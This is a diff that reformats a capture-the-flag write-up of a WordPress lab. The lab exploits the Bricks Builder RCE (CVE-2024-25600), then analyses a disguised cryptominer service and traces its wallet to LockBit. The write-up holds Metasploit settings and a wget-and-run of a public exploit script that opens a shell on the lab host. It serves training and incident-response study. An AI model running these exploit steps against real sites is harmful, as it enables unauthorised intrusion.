@@ -1,8 +1,9 @@
-**Category:** Web Exploitation / Malware Analysis  
-**Difficulty:** Easy
-**Objective:** Compromise a vulnerable WordPress instance, investigate persistence mechanisms, and attribute malicious activity to a real-world APT.
+# Bricks
 
-## 📝 Executive Summary
+**Category:** Web Exploitation / Malware Analysis\
+**Difficulty:** Easy **Objective:** Compromise a vulnerable WordPress instance, investigate persistence mechanisms, and attribute malicious activity to a real-world APT.
+
+### 📝 Executive Summary
 
 During this engagement, I successfully compromised a WordPress host running the vulnerable **Bricks Builder theme** (CVE-2024-25600).
 
@@ -12,26 +13,29 @@ Through analysis of the miner’s configuration (`inet.conf`), I identified a **
 
 **Impact:**
 
-- Unauthorized code execution on the target.
-- Evidence of illicit cryptomining.
-- Attribution to a real-world ransomware group.
+* Unauthorized code execution on the target.
+* Evidence of illicit cryptomining.
+* Attribution to a real-world ransomware group.
 
-___
-# 🔍 Technical Walkthrough
+***
 
-## 1. Initial Enumeration
+## 🔍 Technical Walkthrough
+
+### 1. Initial Enumeration
 
 The target hosted a WordPress site. Using `msfconsole`, I searched for vulnerabilities in the **Bricks Builder** theme:
 
 ```bash
 msf6 > search bricks
 ```
+
 The module `exploit/multi/http/wp_bricks_builder_rce` was identified as a recent unauthenticated RCE.
 
-![Search Msfconsole](./images/01-mfsconsole.png.png)
+![Search Msfconsole](../../.gitbook/assets/01-mfsconsole.png.png)
 
-___
-## 2. Exploitation with Metasploit
+***
+
+### 2. Exploitation with Metasploit
 
 Configured the module with:
 
@@ -42,25 +46,27 @@ set LPORT 1234
 set RPORT 443
 run
 ```
-![Options Msfconsole](./images/02-mfoptions.png.png)
+
+![Options Msfconsole](../../.gitbook/assets/02-mfoptions.png.png)
 
 Result:
 
-- WordPress 6.5 detected
-- Bricks Builder theme v1.9.5 vulnerable
-- **Meterpreter session opened**
+* WordPress 6.5 detected
+* Bricks Builder theme v1.9.5 vulnerable
+* **Meterpreter session opened**
 
-![LS Msfconsole](./images/04-ls.png)
+![LS Msfconsole](../../.gitbook/assets/04-ls.png)
 
 📌 First flag retrieved:
 
-![Flag](./images/05-flag.png)
+![Flag](../../.gitbook/assets/05-flag.png)
 
-___
-## 3. Limitations of Meterpreter
+***
 
-- `ps` command failed (restricted environment)
-- Shell upgrade unsuccessful
+### 3. Limitations of Meterpreter
+
+* `ps` command failed (restricted environment)
+* Shell upgrade unsuccessful
 
 To bypass this, I switched to the **public exploit script** for CVE-2024-25600:
 
@@ -68,12 +74,14 @@ To bypass this, I switched to the **public exploit script** for CVE-2024-25600:
 wget https://raw.githubusercontent.com/Chocapikk/CVE-2024-25600/main/exploit.py
 python3 exploit.py -u https://bricks.thm
 ```
+
 This provided a **fully interactive shell**.
 
-![Exploit](./images/06-exploit.png)
+![Exploit](../../.gitbook/assets/06-exploit.png)
 
-___
-##  4. Investigating Persistence
+***
+
+### 4. Investigating Persistence
 
 Using `systemctl` to enumerate services:
 
@@ -81,28 +89,30 @@ Using `systemctl` to enumerate services:
 systemctl | grep running
 systemctl status ubuntu.service
 ```
+
 Findings:
 
-- Custom service → `ubuntu.service`
-- Description → `TRYHACK3M`
-- Executable → `/lib/NetworkManager/nm-inet-dialog`
+* Custom service → `ubuntu.service`
+* Description → `TRYHACK3M`
+* Executable → `/lib/NetworkManager/nm-inet-dialog`
 
-![Service](./images/07-service.png)
-
+![Service](../../.gitbook/assets/07-service.png)
 
 This indicated a **malicious persistence mechanism**.
 
-![Status](./images/08-status.png)
+![Status](../../.gitbook/assets/08-status.png)
 
-___
-### 5. Miner Log Discovery
+***
+
+#### 5. Miner Log Discovery
 
 Listing the `/lib/NetworkManager/` directory revealed a suspicious config file:
 
 ```bash
 inet.conf
 ```
-![Miner Log](./images/09-miner_log.png)
+
+![Miner Log](../../.gitbook/assets/09-miner_log.png)
 
 Reading it showed mining logs and an encoded **ID string**.
 
@@ -110,10 +120,11 @@ Reading it showed mining logs and an encoded **ID string**.
 cat /lib/NetworkManager/inet.conf
 ```
 
-![Walltet](./images/10-wallet.png)
+![Walltet](../../.gitbook/assets/10-wallet.png)
 
-___
-### 6. Wallet Extraction & Decoding
+***
+
+#### 6. Wallet Extraction & Decoding
 
 The encoded string was passed through **CyberChef** (Hex → Base64 decoding).
 
@@ -123,23 +134,24 @@ Recovered wallet address:
 bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
 ```
 
-![CyberChef](./images/11-cyberchef.png)
+![CyberChef](../../.gitbook/assets/11-cyberchef.png)
 
 To confirm which wallet was valid, i checked both addresses on blockchain.com.
 
-![Blockchain](./images/12-blockchain.png)
+![Blockchain](../../.gitbook/assets/12-blockchain.png)
 
-___
-### 7. Blockchain Analysis
+***
+
+#### 7. Blockchain Analysis
+
 Checking the wallet on blockchain.com confirmed it was valid.
 
-- Active Bitcoin address
-- Associated with large suspicious transactions
+* Active Bitcoin address
+* Associated with large suspicious transactions
 
 While investigating the wallet’s transactions, I identified a **large suspicious transaction**. Tracing it further revealed connections to another wallet:
 
-![Suspicious](./images/13-suspicious.png)
-
+![Suspicious](../../.gitbook/assets/13-suspicious.png)
 
 Further OSINT linked related transactions to:
 
@@ -149,11 +161,11 @@ Further OSINT linked related transactions to:
 
 This address is publicly tied to the **LockBit ransomware group**.
 
-![OSINT](./images/14-OSINT.png)
+![OSINT](../../.gitbook/assets/14-OSINT.png)
 
+***
 
-___
-## 📌 Key Findings
+### 📌 Key Findings
 
 | Category       | Finding                                        |
 | -------------- | ---------------------------------------------- |
@@ -165,18 +177,19 @@ ___
 | Wallet         | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`   |
 | Attribution    | Linked to **LockBit Ransomware Group**         |
 
-___
-## 🎯 Lessons Learned
+***
 
-- **CMS plugins/themes are high-risk** — patching must be enforced.
-- Malicious persistence often masquerades as **system services**.
-- Cryptominer configs can directly expose attacker **wallets**.
-- OSINT analysis provides real-world **APT attribution**.
+### 🎯 Lessons Learned
 
-___
-## ✅ Conclusion
+* **CMS plugins/themes are high-risk** — patching must be enforced.
+* Malicious persistence often masquerades as **system services**.
+* Cryptominer configs can directly expose attacker **wallets**.
+* OSINT analysis provides real-world **APT attribution**.
+
+***
+
+### ✅ Conclusion
 
 The Bricks Heist machine demonstrated how an unpatched WordPress theme could lead to full system compromise, cryptominer deployment, and connections to real-world ransomware groups.
 
 This exercise not only highlights exploitation and privilege escalation, but also integrates **threat intelligence analysis**, making it highly valuable for both red teaming and incident response skill development.
-
